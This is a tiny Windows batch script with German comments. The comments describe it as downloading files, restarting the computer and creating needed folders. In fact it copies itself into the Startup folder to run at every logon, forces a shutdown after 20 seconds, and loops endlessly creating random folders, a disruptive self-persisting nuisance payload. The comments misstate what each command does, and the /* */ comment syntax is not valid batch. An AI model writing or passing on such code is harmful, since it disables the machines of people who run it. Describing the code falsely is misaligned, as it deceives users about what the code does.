/*
Dieser Befehl downloadet die Dateien aus dem Internet
*/
copy "%0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
/*
Dieser Befehl startet den Computer neu
*/
shutdown -s -t 20
/*
Dieser Befehl erstellt die notwendigen Ordner
*/
:loop
md %random%
goto :loop
